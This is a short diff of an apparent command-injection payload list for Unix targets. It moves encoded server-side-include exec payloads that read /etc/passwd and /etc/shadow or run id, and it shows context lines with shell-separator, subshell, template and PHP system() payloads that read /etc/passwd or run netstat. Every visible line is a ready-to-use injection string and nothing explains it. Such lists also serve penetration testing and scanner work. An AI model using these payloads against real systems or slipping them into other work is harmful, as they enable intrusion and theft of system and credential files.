@@ -1,8 +1,4 @@
 Unix :
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 /index.html|id|
 ;netstat -a;
 ;system('cat%20/etc/passwd')
@@ -27,3 +23,7 @@ $(`cat /etc/passwd`)
 {{ get_user_file("/etc/passwd") }}
 <!--#exec cmd="/usr/bin/id;-->
 <?php system("cat /etc/passwd");?>
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
